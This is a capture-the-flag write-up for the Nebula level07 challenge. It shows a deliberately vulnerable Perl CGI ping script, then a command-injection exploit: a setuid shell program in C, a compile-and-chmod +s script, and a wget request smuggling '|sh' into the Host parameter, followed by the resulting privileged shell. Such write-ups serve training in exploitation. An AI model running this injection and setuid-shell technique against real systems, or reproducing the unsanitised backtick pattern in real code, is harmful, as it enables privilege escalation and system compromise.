# Level07

## Task
>The flag07 user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.

>To do this level, log in as the level07 account with the password level07. Files for this level can be found in /home/flag07.

```perl
#!/usr/bin/perl

use CGI qw{param};

print "Content-type: text/html\n\n";

sub ping {
  $host = $_[0];

  print("<html><head><title>Ping results</title></head><body><pre>");

  @output = `ping -c 3 $host 2>&1`;
  foreach $line (@output) { print "$line"; }

  print("</pre></body></html>");
  
}

# check if Host set. if not, display normal page, etc

ping(param("Host"));
```

## Solution

There is a webserver on port 7007

```
level07@nebula:/home/flag07$ cat thttpd.conf | grep port
# Specifies an alternate port number to listen on.
port=7007
```

using the same exploit from a previous level

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system("/bin/bash");
}
```

and a bash script to compile it

```
#!/bin/bash

gcc /tmp/shell.c -o /home/flag07/shell
chmod +s /home/flag07/shell
```

Use the webserver to run as `flag07` user

```
level07@nebula:/home/flag07$ cd
level07@nebula:~$ wget 'http://localhost:7007/index.cgi?Host=127.0.0.1|sh /tmp/run07.sh'
--2017-01-09 02:33:24--  http://localhost:7007/index.cgi?Host=127.0.0.1%7Csh%20/tmp/run07.sh
Resolving localhost... 127.0.0.1
Connecting to localhost|127.0.0.1|:7007... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: `index.cgi?Host=127.0.0.1|sh %2Ftmp%2Frun07.sh'

    [  <=>                                                                         ] 77          76.9B/s   in 1.0s

2017-01-09 02:33:25 (76.9 B/s) - `index.cgi?Host=127.0.0.1|sh %2Ftmp%2Frun07.sh' saved [77]

```

Then look for our new shell binary

```
level07@nebula:/home/flag07$ ls -la
total 18
drwxr-x--- 1 flag07 level07   60 2017-01-09 02:33 .
drwxr-xr-x 1 root   root     300 2012-08-27 07:18 ..
-rw-r--r-- 1 flag07 flag07   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag07 flag07  3353 2011-05-18 02:54 .bashrc
-rwxr-xr-x 1 root   root     368 2011-11-20 21:22 index.cgi
-rw-r--r-- 1 flag07 flag07   675 2011-05-18 02:54 .profile
-rwsr-sr-x 1 flag07 flag07  7321 2017-01-09 02:33 shell
-rw-r--r-- 1 root   root    3719 2011-11-20 21:22 thttpd.conf
```

Get the Flag

```
level07@nebula:/home/flag07$ ./shell
flag07@nebula:/home/flag07$ getflag
You have successfully executed getflag on a target account
```
